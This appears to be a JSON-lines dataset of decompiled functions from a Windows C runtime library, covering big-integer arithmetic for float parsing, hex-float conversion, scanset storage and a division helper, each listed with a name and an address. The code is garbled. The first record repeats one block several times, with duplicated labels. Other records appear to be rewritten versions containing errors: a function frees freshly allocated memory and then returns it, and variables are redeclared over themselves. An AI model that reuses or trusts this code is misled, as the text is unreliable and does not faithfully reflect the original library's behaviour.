{}\n    }\n    local_938 = (uint *)~local_950;\n    if (uVar15 == 0) {\n        iVar10 = 0;\n    } else {\n        iVar10 = iVar10 + 1;\n    }\n    local_934 = (uint *)((int)puVar16 + (int)puVar12);\n    uStack_941 = (uint *)(0x20 - iVar10) < local_93c;\n    if ((local_934 == (uint *)0x73) && ((bool)uStack_941)) {\n        bVar19 = true;\n    } else {\n        bVar19 = false;\n    }\n    if (((uint *)0x73 < local_934) || (bVar19)) {\n        local_578._0_4_ = (uint *)0x0;\n        _memcpy_s((void *)((int)&local_578 + 4), 0x1cc, local_b2c, 0);\n    } else {\n        if ((uint *)0x71 < local_934) {\n            local_934 = (uint *)0x72;\n        }\n        local_930 = local_934;\n        if (local_934 != (uint *)0xffffffff) {\n            puVar17 = (uint *)((int)local_934 - (int)local_928);\n            ppuVar14 = (uint **)((int)&local_578 + (int)((int)puVar17 + 1) * 4);\n            do {\n                puVar16 = local_928;\n                if (local_930 < local_928) break;\n                if (puVar17 < puVar12) {\n                    local_940 = *ppuVar14;\n                } else {\n                    local_940 = (uint *)0x0;\n                }\n                if ((uint *)((int)puVar17 - 1U) < puVar12) {\n                    puVar12 = ppuVar14[-1];\n                } else {\n                    puVar12 = (uint *)0x0;\n                }\n                ppuVar14 = ppuVar14 + -1;\n                *(uint *)((int)&local_578 + (int)((int)local_930 + 1) * 4) =\n                    ((uint)puVar12 & (uint)local_938) >> ((byte)local_94c & 0x1f) |\n                    ((uint)local_940 & local_950) << ((byte)local_93c & 0x1f);\n                local_930 = (uint *)((int)local_930 - 1);\n                puVar17 = (uint *)((int)puVar17 + -1);\n                puVar12 = (uint *)local_578;\n            } while (local_930 != (uint *)0xffffffff);\n        }\n        if (puVar16 != (uint *)0x0) {\n            puVar18 = (undefined4 *)((int)&local_578 + 4);\n            for (; puVar16 != (uint *)0x0; puVar16 = (uint *)((int)puVar16 + -1)) {\n                *puVar18 = 0;\n                puVar18 = puVar18 + 1;\n            }\n        }\n        local_578._0_4_ = local_934;\n        if (!(bool)uStack_941) {\n            local_578._0_4_ = (uint *)((int)local_934 + 1);\n        }\n        puVar12 = (uint *)local_578;\n    }\n    local_954 = (uint *)((int)local_954 - (int)local_948);\n    puVar16 = local_954;\n    if (local_948 != (uint *)0x0) {\n        if (local_954 < local_92c) {\n            bVar19 = true;\n            uVar2 = *(undefined *)(local_958 + 0xc2);\n            goto LAB_100225ea;\n        }\n        puVar16 = (uint *)((int)local_954 - (int)local_92c);\n    }\n    if (puVar12 <= local_924) {\n        if (puVar12 < local_924) {\n            LAB_1002230a:\n            local_92c = (uint *)((int)local_92c + 1);\n        } else {\n            pbVar11 = (byte *)((int)puVar12 + -1);\n            if (pbVar11 != (byte *)0xffffffff) {\n                do {\n                    if (*(int *)((int)&local_578 + (int)(pbVar11 + 1) * 4) !=\n                        *(int *)((int)local_3a8 + (int)(pbVar11 + 1) * 4)) break;\n                    pbVar11 = pbVar11 + -1;\n                } while (pbVar11 != (byte *)0xffffffff);\n                if ((pbVar11 != (byte *)0xffffffff) &&\n                    (*(uint *)((int)&local_578 + (int)(pbVar11 + 1) * 4) <=\n                     *(uint *)((int)local_3a8 + (int)(pbVar11 + 1) * 4))) goto LAB_1002230a;\n            }\n        }\n    }\n    local_93c = (uint *)((uint)puVar16 & 0x1f);\n    puVar16 = (uint *)((uint)puVar16 >> 5);\n    local_94c = 0x20 - (int)local_93c;\n    local_928 = puVar16;\n    lVar20 = __allshl((byte)local_94c, 0);\n    uVar15 = *(uint *)((int)&local_578 + (int)puVar12 * 4);\n    local_950 = (int)lVar20 - 1;\n    iVar10 = 0x1f;\n    if (uVar15 != 0) {\n        for (; uVar15 >> iVar10 == 0; iVar10 = iVar10 + -1) {}\n    }\n    local_938 = (uint *)~local_950;\n    if (uVar15 == 0) {\n        iVar10 = 0;\n    } else {\n        iVar10 = iVar10 + 1;\n    }\n    local_934 = (uint *)((int)puVar16 + (int)puVar12);\n    uStack_941 = (uint *)(0x20 - iVar10) < local_93c;\n    if ((local_934 == (uint *)0x73) && ((bool)uStack_941)) {\n        bVar19 = true;\n    } else {\n        bVar19 = false;\n    }\n    if (((uint *)0x73 < local_934) || (bVar19)) {\n        local_578._0_4_ = (uint *)0x0;\n        _memcpy_s((void *)((int)&local_578 + 4), 0x1cc, local_b2c, 0);\n    } else {\n        if ((uint *)0x71 < local_934) {\n            local_934 = (uint *)0x72;\n        }\n        local_930 = local_934;\n        if (local_934 != (uint *)0xffffffff) {\n            puVar17 = (uint *)((int)local_934 - (int)local_928);\n            ppuVar14 = (uint **)((int)&local_578 + (int)((int)puVar17 + 1) * 4);\n            do {\n                puVar16 = local_928;\n                if (local_930 < local_928) break;\n                if (puVar17 < puVar12) {\n                    local_940 = *ppuVar14;\n                } else {\n                    local_940 = (uint *)0x0;\n                }\n                if ((uint *)((int)puVar17 - 1U) < puVar12) {\n                    puVar12 = ppuVar14[-1];\n                } else {\n                    puVar12 = (uint *)0x0;\n                }\n                ppuVar14 = ppuVar14 + -1;\n                *(uint *)((int)&local_578 + (int)((int)local_930 + 1) * 4) =\n                    ((uint)puVar12 & (uint)local_938) >> ((byte)local_94c & 0x1f) |\n                    ((uint)local_940 & local_950) << ((byte)local_93c & 0x1f);\n                local_930 = (uint *)((int)local_930 - 1);\n                puVar17 = (uint *)((int)puVar17 + -1);\n                puVar12 = (uint *)local_578;\n            } while (local_930 != (uint *)0xffffffff);\n        }\n        if (puVar16 != (uint *)0x0) {\n            puVar18 = (undefined4 *)((int)&local_578 + 4);\n            for (; puVar16 != (uint *)0x0; puVar16 = (uint *)((int)puVar16 + -1)) {\n                *puVar18 = 0;\n                puVar18 = puVar18 + 1;\n            }\n        }\n        local_578._0_4_ = local_934;\n        if (!(bool)uStack_941) {\n            local_578._0_4_ = (uint *)((int)local_934 + 1);\n        }\n        puVar12 = (uint *)local_578;\n    }\n    local_954 = (uint *)((int)local_954 - (int)local_948);\n    puVar16 = local_954;\n    if (local_948 != (uint *)0x0) {\n        if (local_954 < local_92c) {\n            bVar19 = true;\n            uVar2 = *(undefined *)(local_958 + 0xc2);\n            goto LAB_100225ea;\n        }\n        puVar16 = (uint *)((int)local_954 - (int)local_92c);\n    }\n    if (puVar12 <= local_924) {\n        if (puVar12 < local_924) {\n            LAB_1002230a:\n            local_92c = (uint *)((int)local_92c + 1);\n        } else {\n            pbVar11 = (byte *)((int)puVar12 + -1);\n            if (pbVar11 != (byte *)0xffffffff) {\n                do {\n                    if (*(int *)((int)&local_578 + (int)(pbVar11 + 1) * 4) !=\n                        *(int *)((int)local_3a8 + (int)(pbVar11 + 1) * 4)) break;\n                    pbVar11 = pbVar11 + -1;\n                } while (pbVar11 != (byte *)0xffffffff);\n                if ((pbVar11 != (byte *)0xffffffff) &&\n                    (*(uint *)((int)&local_578 + (int)(pbVar11 + 1) * 4) <=\n                     *(uint *)((int)local_3a8 + (int)(pbVar11 + 1) * 4))) goto LAB_1002230a;\n            }\n        }\n    }\n    local_93c = (uint *)((uint)puVar16 & 0x1f);\n    puVar16 = (uint *)((uint)puVar16 >> 5);\n    local_94c = 0x20 - (int)local_93c;\n    local_928 = puVar16;\n    lVar20 = __allshl((byte)local_94c, 0);\n    uVar15 = *(uint *)((int)&local_578 + (int)puVar12 * 4);\n    local_950 = (int)lVar20 - 1;\n    iVar10 = 0x1f;\n    if (uVar15 != 0) {\n        for (; uVar15 >> iVar10 == 0; iVar10 = iVar10 + -1) {}\n    }\n    local_938 = (uint *)~local_950;\n    if (uVar15 == 0) {\n        iVar10 = 0;\n    } else {\n        iVar10 = iVar10 + 1;\n    }\n    local_934 = (uint *)((int)puVar16 + (int)puVar12);\n    uStack_941 = (uint *)(0x20 - iVar10) < local_93c;\n    if ((local_934 == (uint *)0x73) && ((bool)uStack_941)) {\n        bVar19 = true;\n    } else {\n        bVar19 = false;\n    }\n    if (((uint *)0x73 < local_934) || (bVar19)) {\n        local_578._0_4_ = (uint *)0x0;\n        _memcpy_s((void *)((int)&local_578 + 4), 0x1cc, local_b2c, 0);\n    } else {\n        if ((uint *)0x71 < local_934) {\n            local_934 = (uint *)0x72;\n        }\n        local_930 = local_934;\n        if (local_934 != (uint *)0xffffffff) {\n            puVar17 = (uint *)((int)local_934 - (int)local_928);\n            ppuVar14 = (uint **)((int)&local_578 + (int)((int)puVar17 + 1) * 4);\n            do {\n                puVar16 = local_928;\n                if (local_930 < local_928) break;\n                if (puVar17 < puVar12) {\n                    local_940 = *ppuVar14;\n                } else {\n                    local_940 = (uint *)0x0;\n                }\n                if ((uint *)((int)puVar17 - 1U) < puVar12) {\n                    puVar12 = ppuVar14[-1];\n                } else {\n                    puVar12 = (uint *)0x0;\n                }\n                ppuVar14 = ppuVar14 + -1;\n                *(uint *)((int)&local_578 + (int)((int)local_930 + 1) * 4) =\n                    ((uint)puVar12 & (uint)local_938) >> ((byte)local_94c & 0x1f) |\n                    ((uint)local_940 & local_950) << ((byte)local_93c & 0x1f);\n                local_930 = (uint *)((int)local_930 - 1);\n                puVar17 = (uint *)((int)puVar17 + -1);\n                puVar12 = (uint *)local_578;\n            } while (local_930 != (uint *)0xffffffff);\n        }\n        if (puVar16 != (uint *)0x0) {\n            puVar18 = (undefined4 *)((int)&local_578 + 4);\n            for (; puVar16 != (uint *)0x0; puVar16 = (uint *)((int)puVar16 + -1)) {\n                *puVar18 = 0;\n                puVar18 = puVar18 + 1;\n            }\n        }\n        local_578._0_4_ = local_934;\n        if (!(bool)uStack_941) {\n            local_578._0_4_ = (uint *)((int)local_934 + 1);\n        }\n        puVar12 = (uint *)local_578;\n    }\n    local_954 = (uint *)((int)local_954 - (int)local_948);\n    puVar16 = local_954;\n    if (local_948 != (uint *)0x0) {\n        if (local_954 < local_92c) {\n            bVar19 = true;\n            uVar2 = *(undefined *)(local_958 + 0xc2);\n            goto LAB_100225ea;\n        }\n        puVar16 = (uint *)((int)local_954 - (int)local_92c);\n    }\n    if (puVar12 <= local_924) {\n        if (puVar12 < local_924) {\n            LAB_1002230a:\n            local_92c = (uint *)((int)local_92c + 1);\n        } else {\n            pbVar11 = (byte *)((int)puVar12 + -1);\n            if (pbVar11 != (byte *)0xffffffff) {\n                do {\n                    if (*(int *)((int)&local_578 + (int)(pbVar11 + 1) * 4) !=\n                        *(int *)((int)local_3a8 + (int)(pbVar11 + 1) * 4)) break;\n                    pbVar11 = pbVar11 + -1;\n                } while (pbVar11 != (byte *)0xffffffff);\n                if ((pbVar11 != (byte *)0xffffffff) &&\n                    (*(uint *)((int)&local_578 + (int)(pbVar11 + 1) * 4) <=\n                     *(uint *)((int)local_3a8 + (int)(pbVar11 + 1) * 4))) goto LAB_1002230a;\n            }\n        }\n    }\n    local_93c = (uint *)((uint)puVar16 & 0x1f);\n    puVar16 = (uint *)((uint)puVar16 >> 5);\n    local_94c = 0x20 - (int)local_93c;\n    local_928 = puVar16;\n    lVar20 = __allshl((byte)local_94c, 0);\n    uVar15 = *(uint *)((int)&local_578 + (int)puVar12 * 4);\n    local_950 = (int)lVar20 - 1;\n    iVar10 = 0x1f;\n    if (uVar15 != 0) {\n        for (; uVar15 >> iVar10 == 0; iVar10 = iVar10 + -1) {}\n    }\n    local_938 = (uint *)~local_950;\n    if (uVar15 == 0) {\n        iVar10 = 0;\n    } else {\n        iVar10 = iVar10 + 1;\n    }\n    local_934 = (uint *)((int)puVar16 + (int)puVar12);\n    uStack_941 = (uint *)(0x20 - iVar10) < local_93c;\n    if ((local_934 == (uint *)0x73) && ((bool)uStack_941)) {\n        bVar19 = true;\n    } else {\n        bVar19 = false;\n    }\n    if (((uint *)0x73 < local_934) || (bVar19)) {\n        local_578._0_4_ = (uint *)0x0;\n        _memcpy_s((void *)((int)&local_578 + 4), 0x1cc, local_b2c, 0);\n    } else {\n        if ((uint *)0x71 < local_934) {\n            local_934 = (uint *)0x72;\n        }\n        local_930 = local_934;\n        if (local_934 != (uint *)0xffffffff) {\n            puVar17 = (uint *)((int)local_934 - (int)local_928);\n            ppuVar14 = (uint **)((int)&local_578 + (int)((int)puVar17 + 1) * 4);\n            do {\n                puVar16 = local_928;\n                if (local_930 < local_928) break;\n                if (puVar17 < puVar12) {\n                    local_940 = *ppuVar14;\n                } else {\n                    local_940 = (uint *)0x0;\n                }\n                if ((uint *)((int)puVar17 - 1U) < puVar12) {\n                    puVar12 = ppuVar14[-1];\n                } else {\n                    puVar12 = (uint *)0x0;\n                }\n                ppuVar14 = ppuVar14 + -1;\n                *(uint *)((int)&local_578 + (int)((int)local_930 + 1) * 4) =\n                    ((uint)puVar12 & (uint)local_938) >> ((byte)local_94c & 0x1f) |\n                    ((uint)local_940 & local_950) << ((byte)local_93c & 0x1f);\n                local_930 = (uint *)((int)local_930 - 1);\n                puVar17 = (uint *)((int)puVar17 + -1);\n                puVar12 = (uint *)local_578;\n            } while (local_930 != (uint *)0xffffffff);\n        }\n        if (puVar16 != (uint *)0x0) {\n            puVar18 = (undefined4 *)((int)&local_578 + 4);\n            for (; puVar16 != (uint *)0x0; puVar16 = (uint *)((int)puVar16 + -1)) {\n                *puVar18 = 0;\n                puVar18 = puVar18 + 1;\n            }\n        }\n        local_578._0_4_ = local_934;\n        if (!(bool)uStack_941) {\n            local_578._0_4_ = (uint *)((int)local_934 + 1);\n        }\n        puVar12 = (uint *)local_578;\n    }\n    local_954 = (uint *)((int)local_954 - (int)local_948);\n    puVar16 = local_954;\n    if (local_948 != (uint *)0x0) {\n        if (local_954 < local_92c) {\n            bVar19 = true;\n            uVar2 = *(undefined *)(local_958 + 0xc2);\n            goto LAB_100225ea;\n        }\n        puVar16 = (uint *)((int)local_954 - (int)local_92c);\n    }\n    if (puVar12 <= local_924) {\n        if (puVar12 < local_924) {\n            LAB_1002230a:\n            local_92c = (uint *)((int)local_92c + 1);\n        } else {\n            pbVar11 = (byte *)((int)puVar12 + -1);\n            if (pbVar11 != (byte *)0xffffffff) {\n                do {\n                    if (*(int *)((int)&local_578 + (int)(pbVar11 + 1) * 4) !=\n                        *(int *)((int)local_3a8 + (int)(pbVar11 + 1) * 4)) break;\n                    pbVar11 = pbVar11 + -1;\n                } while (pbVar11 != (byte *)0xffffffff);\n                if ((pbVar11 != (byte *)0xffffffff) &&\n                    (*(uint *)((int)&local_578 + (int)(pbVar11 + 1) * 4) <=\n                     *(uint *)((int)local_3a8 + (int)(pbVar11 + 1) * 4))) goto LAB_1002230a;\n            }\n        }\n    }\n    local_93c = (uint *)((uint)puVar16 & 0x1f);\n    puVar16 = (uint *)((uint)puVar16 >> 5);\n    local_94c = 0x20 - (int)local_93c;\n    local_928 = puVar16;\n    lVar20 = __allshl((byte)local_94c, 0);\n    uVar15 = *(uint *)((int)&local_578 + (int)puVar12 * 4);\n    local_950 = (int)lVar20 - 1;\n    iVar10 = 0x1f;\n    if (uVar15 != 0) {\n        for (; uVar15 >> iVar10 == 0; iVar10 = iVar10 + -1) {}\n    }\n    local_938 = (uint *)~local_950;\n    if (uVar15 == 0) {\n        iVar10 = 0;\n    } else {\n        iVar10 = iVar10 + 1;\n    }\n    local_934 = (uint *)((int)puVar16 + (int)puVar12);\n    uStack_941 = (uint *)(0x20 - iVar10) < local_93c;\n    if ((local_934 == (uint *)0x73) && ((bool)uStack_941)) {\n        bVar19 = true;\n    } else {\n        bVar19 = false;\n    }\n    if (((uint *)0x73 < local_934) || (bVar19)) {\n        local_578._0_4_ = (uint *)0x0;\n        _memcpy_s((void *)((int)&local_578 + 4), 0x1cc, local_b2c, 0);\n    } else {\n        if ((uint *)0x71 < local_934) {\n            local_934 = (uint *)0x72;\n        }\n        local_930 = local_934;\n        if (local_934 != (uint *)0xffffffff) {\n            puVar17 = (uint *)((int)local_934 - (int)local_928);\n            ppuVar14 = (uint **)((int)&local_578 + (int)((int)puVar17 + 1) * 4);\n            do {\n                puVar16 = local_928;\n                if (local_930 < local_928) break;\n                if (puVar17 < puVar12) {\n                    local_940 = *ppuVar14;\n                } else {\n                    local_940 = (uint *)0x0;\n                }\n                if ((uint *)((int)puVar17 - 1U) < puVar12) {\n                    puVar12 = ppuVar14[-1];\n                } else {\n                    puVar12 = (uint *)0x0;\n                }\n                ppuVar14 = ppuVar14 + -1;\n                *(uint *)((int)&local_578 + (int)((int)local_930 + 1) * 4) =\n                    ((uint)puVar12 & (uint)local_938) >> ((byte)local_94c & 0x1f) |\n                    ((uint)local_940 & local_950) << ((byte)local_93c & 0x1f);\n                local_930 = (uint *)((int)local_930 - 1);\n                puVar17 = (uint *)((int)puVar17 + -1);\n                puVar12 = (uint *)local_578;\n            } while (local_930 != (uint *)0xffffffff);\n        }\n        if (puVar16 != (uint *)0x0) {\n            puVar18 = (undefined4 *)((int)&local_578 + 4);\n            for (; puVar16 != (uint *)0x0; puVar16 = (uint *)((int)puVar16 + -1)) {\n                *puVar18 = 0;\n                puVar18 = puVar18 + 1;\n            }\n        }\n        local_578._0_4_ = local_934;\n        if (!(bool)uStack_941) {\n            local_578._0_4_ = (uint *)((int)local_934 + 1);\n        }\n        puVar12 = (uint *)local_578;\n    }\n    local_954 = (uint *)((int)local_954 - (int)local_948);\n    puVar16 = local_954;\n    if (local_948 != (uint *)0x0) {\n        if (local_954 < local_92c) {\n            bVar19 = true;\n            uVar2 = *(undefined *)(local_958 + 0xc2);\n            goto LAB_100225ea;\n        }\n        puVar16 = (uint *)((int)local_954 - (int)local_92c);\n    }\n    if (puVar12 <= local_924) {\n        if (puVar12 < local_924) {\n            LAB_1002230a:\n            local_92c = (uint *)((int)local_92c + 1);\n        } else {\n            pbVar11 = (byte *)((int)puVar12 + -1);\n            if (pbVar11 != (byte *)0xffffffff) {\n                do {\n                    if (*(int *)((int)&local_578 + (int)(pbVar11 + 1) * 4) !=\n                        *(int *)((int)local_3a8 + (int)(pbVar11 + 1) * 4)) break;\n                    pbVar11 = pbVar11 + -1;\n                } while (pbVar11 != (byte *)0xffffffff);\n                if ((pbVar11 != (byte *)0xffffffff) &&\n                    (*(uint *)((int)&local_578 + (int)(pbVar11 + 1) * 4) <=\n                     *(uint *)((int)local_3a8 + (int)(pbVar11 + 1) * 4))) goto LAB_1002230a;\n            }\n        }\n    }\n    local_93c = (uint *)((uint)puVar16 & 0x1f);\n    puVar16 = (uint *)((uint)puVar16 >> 5);\n    local_94c = 0x20 - (int)local_93c;\n    local_928 = puVar16;\n    lVar20 = __allshl((byte)local_94c, 0);\n    uVar15 = *(uint *)((int)&local_578 + (int)puVar12 * 4);\n    local_950 = (int)lVar20 - 1;\n    iVar10 = 0x1f;\n    if (uVar15 != 0) {\n        for (; uVar15 >> iVar10 == 0; iVar10 = iVar10 + -1) {}\n    }\n    local_938 = (uint *)~local_950;\n    if (uVar15 == 0) {\n        iVar10 = 0;\n    } else {\n        iVar10 = iVar10 + 1;\n    }\n    local_934 = (uint *)((int)puVar16 + (int)puVar12);\n    uStack_941 = (uint *)(0x20 - iVar10) < local_93c;\n    if ((local_934 == (uint *)0x73) && ((bool)uStack_941)) {\n        bVar19 = true;\n    } else {\n        bVar19 = false;\n    }\n    if (((uint *)0x73 < local_934) || (bVar19)) {\n        local_578._0_4_ = (uint *)0x0;\n        _memcpy_s((void *)((int)&local_578 + 4), 0x1cc, local_b2c, 0);\n    } else {\n        if ((uint *)0x71 < local_934) {\n            local_934 = (uint *)0x72;\n        }\n        local_930 = local_934;\n        if (local_934 != (uint *)0xffffffff) {\n            puVar17 = (uint *)((int)local_934 - (int)local_928);\n            ppuVar14 = (uint **)((int)&local_578 + (int)((int)puVar17 + 1) * 4);\n            do {\n                puVar16 = local_928;\n                if (local_930 < local_928) break;\n                if (puVar17 < puVar12) {\n                    local_940 = *ppuVar14;\n                } else {\n                    local_940 = (uint *)0x0;\n                }\n                if ((uint *)((int)puVar17 - 1U) < puVar12) {\n                    puVar12 = ppuVar14[-1];\n                } else {\n                    puVar12 = (uint *)0x0;\n                }\n                ppuVar14 = ppuVar14 + -1;\n                *(uint *)((int)&local_578 + (int)((int)local_930 + 1) * 4) =\n                    ((uint)puVar12 & (uint)local_938) >> ((byte)local_94c & 0x1f) |\n                    ((uint)local_940 & local_950) << ((byte)local_93c & 0x1f);\n                local_930 = (uint *)((int)local_930 - 1);\n                puVar17 = (uint *)((int)puVar17 + -1);\n                puVar12 = (uint *)local_578;\n            } while (local_930 != (uint *)0xffffffff);\n        }\n        if (puVar16 != (uint *)0x0) {\n            puVar18 = (undefined4 *)((int)&local_578 + 4);\n            for (; puVar16 != (uint *)0x0; puVar16 = (uint *)((int)puVar16 + -1)) {\n                *puVar18 = 0;\n                puVar18 = puVar18 + 1;\n            }\n        }\n        local_578._0_4_ = local_934;\n        if (!(bool)uStack_941) {\n            local_578._0_4_ = (uint *)((int)local_934 + 1);\n        }\n        puVar12 = (uint *)local_578;\n    }\n    local_954 = (uint *)((int)local_954 - (int)local_948);\n    puVar16 = local_954;\n    if (local_948 != (uint *)0x0) {\n        if (local_954 < local_92c) {\n            bVar19 = true;\n            uVar2 = *(undefined *)(local_958 + 0xc2);\n            goto LAB_100225ea;\n        }\n        puVar16 = (uint *)((int)local_954 - (int)local_92c);\n    }\n    if (puVar12 <= local_924) {\n        if (puVar12 < local_924) {\n            LAB_1002230a:\n            local_92c = (uint *)((int)local_92c + 1);\n        } else {\n            pbVar11 = (byte *)((int)puVar12 + -1);\n            if (pbVar11 != (byte *)0xffffffff) {\n                do {\n                    if (*(int *)((int)&local_578 + (int)(pbVar11 + 1) * 4) !=\n                        *(int *)((int)local_3a8 + (int)(pbVar11 + 1) * 4)) break;\n                    pbVar11 = pbVar11 + -1;\n                } while (pbVar11 != (byte *)0xffffffff);\n                if ((pbVar11 != (byte *)0xffffffff) &&\n                    (*(uint *)((int)&local_578 + (int)(pbVar11 + 1) * 4) <=\n                     *(uint *)"}
{"Function Name": "__crt_strtox::convert_hexadecimal_string_to_floating_type_common", "Address": "1002260a", "Source Code": "SLD_STATUS __cdecl\n__crt_strtox::convert_hexadecimal_string_to_floating_type_common\n(floating_point_string *param_1,floating_point_value *param_2)\n{\n    floating_point_string fVar1; \n    uint uVar3; \n    int iVar5; \n    SLD_STATUS SVar6; \n    uint uVar7; \n    floating_point_string *pfVar8; \n    uint uVar9; \n    __uint64 _Var11; \n    uVar9 = 0; \n    pfVar8 = param_1 + 8; \n    iVar5 = *(int *)param_1 + ((param_2[4] == (floating_point_value)0x0) - 1 & 0x1d) + 0x17; \n    \n    for (uVar7 = 0; (pfVar8 != param_1 + *(int *)(param_1 + 4) + 8 && \n        (uVar7 <= (_Var11 = floating_point_value::normal_mantissa_mask(param_2)))) ; \n        uVar7 = (uVar7 << 4 | uVar3) + (uint)CARRY4(uVar9,(uint)(byte)fVar1)) {\n        \n        fVar1 = *pfVar8; \n        uVar3 = uVar9 >> 0x1c; \n        uVar9 = uVar9 * 0x10 + (byte)fVar1; \n        iVar5 -= 4; \n        pfVar8++; \n    }\n    do {\n        char cVar4 = '\\x01'; \n        while (true) {\n            \n            if ((pfVar8 == param_1 + *(int *)(param_1 + 4) + 8) || (cVar4 == '\\0')) {\n                \n                SVar6 = FUN_1002033d(uVar9, uVar7, iVar5, (bool)param_1[0x308], cVar4, param_2);\n                return SVar6; \n            }\n            fVar1 = *pfVar8++; \n            if (fVar1 == (floating_point_string)0x0) break; \n            cVar4 = '\\0'; \n        }\n    } while (true); \n}"}
{"Function Name": "__crt_stdio_input::scanset_storage<2>::data", "Address": "100226b6", "Source Code": "\\*\nuchar * __thiscall __crt_stdio_input::scanset_storage_instance<2>::retrieve_data(scanset_storage_instance<2> *scanset_instance)\n{\n    \n    if (*(int *)scanset_instance == 0) {\n        \n        scanset_instance = (scanset_storage_instance<2> *)allocate_memory(0x2000, 1);\n        \n        \n        __crt_unique_heap_ptr<char, struct___crt_internal_free_policy>::operator=(\n            (__crt_unique_heap_ptr<char, struct___crt_internal_free_policy> *)scanset_instance,\n            (__crt_unique_heap_ptr<char, struct___crt_internal_free_policy> *)&scanset_instance);\n        \n        \n        free_memory(scanset_instance);\n    }\n    \n    \n    return *(uchar **)scanset_instance;\n}\n*\\ \n \nuchar * __thiscall __crt_stdio_input::scanset_storage_instance<2>::retrieve_data(scanset_storage_instance<2> *scanset_instance)\n{\n    if (*(int *)scanset_instance == 0) {\n        scanset_instance = (scanset_storage_instance<2> *)allocate_memory(0x2000, 1);\n        __crt_unique_heap_ptr<char, struct___crt_internal_free_policy>::operator=(\n            (__crt_unique_heap_ptr<char, struct___crt_internal_free_policy> *)scanset_instance,\n            (__crt_unique_heap_ptr<char, struct___crt_internal_free_policy> *)&scanset_instance);\n        free_memory(scanset_instance);\n    }\n    return *(uchar **)scanset_instance;\n}"}
{"Function Name": "FUN_100226f0", "Address": "100226f0", "Source Code": "undefined8 __fastcall FUN_100226f0(int input_address)\n{\n    \n    if (*(char *)(input_address + 4) != '\\0') {\n        \n        return 0xfffffffffffff;\n    }\n    \n    return 0x7fffff;\n}"}
{"Function Name": "FUN_10022710", "Address": "10022710", "Source Code": "ulonglong __cdecl FUN_10022710(uint *param_1,uint *param_2)\n{\n    ulonglong intermediateResult; \n    uint *param1Pointer; \n    uint tempValue1; \n    uint finalValue; \n    uint tempValue2; \n    uint finalCounter; \n    int loopIndex; \n    uint *param1EndPointer; \n    uint param2Value; \n    uint intermediateValue1; \n    uint previousParam2Value; \n    uint *resultPointer; \n    uint stackValue1; \n    int stackValue2; \n    uint totalLength; \n    uint localParam2; \n    uint intermediateValue5; \n    undefined tempBuffer [460]; \n    finalValue = *param_1; \n    if (finalValue == 0) { \n        return 0; \n    }\n    param2Value = *param_2; \n    if (param2Value == 0) { \n        return 0; \n    }\n    localParam2 = finalValue - 1; \n    finalCounter = param2Value - 1; \n    if (finalCounter == 0) { \n        intermediateValue1 = param_2[1]; \n        if (intermediateValue1 == 1) { \n            finalValue = param_1[1]; \n            *param_1 = 0; \n            _memcpy_s(param_1 + 1, 0x1cc, tempBuffer, 0); \n            return (ulonglong)finalValue; \n        }\n        if (localParam2 == 0) { \n            finalValue = param_1[1]; \n            *param_1 = 0; \n            _memcpy_s(param_1 + 1, 0x1cc, tempBuffer, 0); \n            finalCounter = finalValue % intermediateValue1; \n            param_1[1] = finalCounter; \n            *param_1 = (uint)(finalCounter != 0); \n            return (ulonglong)finalValue / (ulonglong)intermediateValue1; \n        }\n        finalCounter = 0; \n        totalLength = 0; \n        resultPointer = (uint *)0x0; \n        if (localParam2 != 0xffffffff) { \n            param1EndPointer = param_1 + finalValue; \n            param1Pointer = param_1; \n            intermediateValue1 = finalValue; \n            do {\n                intermediateResult = __aulldvrm(*param1EndPointer, finalCounter, intermediateValue1, 0); \n                param1EndPointer = param1EndPointer + -1; \n                intermediateValue5 = totalLength; \n                intermediateValue1 = intermediateValue1 - 1; \n                finalCounter = (uint)(intermediateResult >> 0x20); \n                resultPointer = param1Pointer; \n                totalLength = (int)intermediateResult; \n            } while (intermediateValue1 != 0); \n            intermediateValue1 = 0; \n        }\n        *param_1 = 0; \n        _memcpy_s(param_1 + 1, 0x1cc, tempBuffer, 0); \n        param_1[1] = finalCounter; \n        param_1[2] = (uint)resultPointer; \n        *param_1 = (resultPointer != (uint *)0x0) + 1; \n        return CONCAT44(intermediateValue5, totalLength); \n    }\n    if (finalCounter <= localParam2) { \n        loopIndex = localParam2 - finalCounter; \n        if (loopIndex <= (int)localParam2) { \n            param1EndPointer = param_1 + finalValue; \n            param1Pointer = param_2 + (localParam2 - loopIndex) + 1; \n            finalValue = localParam2; \n            do {\n                if (*param1Pointer != *param1EndPointer) { \n                    if (param_1[finalValue + 1] <= param_2[(finalValue - loopIndex) + 1]) goto LAB_100228c8; \n                    break; \n                }\n                finalValue = finalValue - 1; \n                param1Pointer = param1Pointer + -1; \n                param1EndPointer = param1EndPointer + -1; \n            } while (loopIndex <= (int)finalValue); \n        }\n        loopIndex = loopIndex + 1; \n        LAB_100228c8: \n        if (loopIndex != 0) { \n            uint param2Value = param_2[param2Value]; \n            previousParam2Value = param_2[param2Value - 1]; \n            int bitIndex = 0x1f; \n            if (param2Value != 0) { \n                for (; param2Value >> bitIndex == 0; bitIndex = bitIndex + -1) { \n                }\n            }\n            if (param2Value == 0) { \n                bitIndex = 0x20; \n            }\n            else {\n                bitIndex = 0x1f - bitIndex; \n            }\n            int shiftCount = 0x20 - bitIndex; \n            if (bitIndex != 0) { \n                finalValue = previousParam2Value >> ((byte)shiftCount & 0x1f); \n                previousParam2Value = previousParam2Value << ((byte)bitIndex & 0x1f); \n                param2Value = param2Value << ((byte)bitIndex & 0x1f) | finalValue; \n                if (2 < param2Value) { \n                    previousParam2Value = previousParam2Value | param_2[param2Value - 2] >> ((byte)shiftCount & 0x1f); \n                }\n            }\n            uint stackValue3 = 0; \n            intermediateValue1 = loopIndex + -1; \n            if ((int)intermediateValue1 < 0) { \n                intermediateResult = 0; \n                stackValue3 = 0; \n            }\n            else {\n                resultPointer = param_1 + loopIndex; \n                totalLength = intermediateValue1 + param2Value; \n                uint *puStack_50 = param_1 + (totalLength - 1); \n                intermediateResult = stackValue3; \n                do {\n                    stackValue3 = intermediateResult; \n                    uint uStack_40 = (localParam2 < totalLength) ? 0 : puStack_50[2]; \n                    uint finalValue = puStack_50[1]; \n                    stackValue1 = *puStack_50; \n                    uint tempValue3 = 0; \n                    if (bitIndex != 0) { \n                        finalValue = stackValue1 >> ((byte)shiftCount & 0x1f); \n                        longlong lVar14 = __allshl((byte)bitIndex, uStack_40); \n                        uStack_40 = (uint)((ulonglong)lVar14 >> 0x20); \n                        finalValue = finalValue | (uint)lVar14; \n                        stackValue1 = stackValue1 << ((byte)bitIndex & 0x1f); \n                        if (2 < totalLength) { \n                            stackValue1 = stackValue1 | param_1[param2Value + intermediateValue1 + -2] >> 